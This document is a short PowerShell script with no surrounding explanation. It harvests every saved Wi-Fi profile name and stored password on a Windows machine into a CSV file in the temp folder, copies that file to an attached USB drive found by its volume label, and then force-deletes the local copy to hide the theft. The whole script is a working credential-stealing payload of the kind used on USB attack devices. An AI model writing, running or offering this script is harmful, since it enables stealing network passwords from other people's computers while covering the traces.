Get-WLANProfile | 
  Select-Object Name, @{n='Password';e={(Get-WLANProfile -Name $_.Name).KeyMaterial}} | 
  Export-Csv -Path "c:\windows\temp\temp.csv"

$destination = (Get-WmiObject -Query "SELECT * FROM Win32_LogicalDisk WHERE VolumeName='USB_DRIVE_LABEL'").DeviceID

Copy-Item "c:\windows\temp\temp.csv" -Destination "$destination\temp.csv"

Remove-Item "c:\windows\temp\temp.csv" -Force